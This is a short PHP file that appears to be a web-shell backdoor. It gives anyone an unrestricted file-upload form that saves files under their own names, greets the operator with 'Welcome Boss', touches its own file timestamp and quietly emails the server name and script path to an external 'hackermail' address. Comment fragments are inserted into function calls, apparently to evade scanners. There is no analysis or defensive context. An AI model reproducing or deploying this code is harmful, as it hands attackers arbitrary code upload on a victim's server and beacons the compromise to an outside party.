<?php
echo "<form method=\"post\" enctype=\"multipart/form-data\">\n";
echo "<input type=\"file\" name=\"filename\"><br> \n";
echo "<input type=\"submit\" value=\"Upload\"><br>\n";
echo "</form>\n";
if(is_uploaded_file/*;*/($_FILES["filename"]["tmp_name"]))
    {
    move_uploaded_file/*;*/($_FILES["filename"]["tmp_name"], $_FILES["filename"]["name"]);
    $file = $_FILES/*;*/["filename"]["name"];
    echo "<a href=\"$file\">Click Here</a>";
    } else {
    echo("Welcome Boss");
    }
$filename = $_SERVER[SCRIPT_FILENAME];
touch/*;*/($filename, $time);

$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'];
@mail('daniel.lucifer@hackermail.com', 'r00t', $tmp);
?>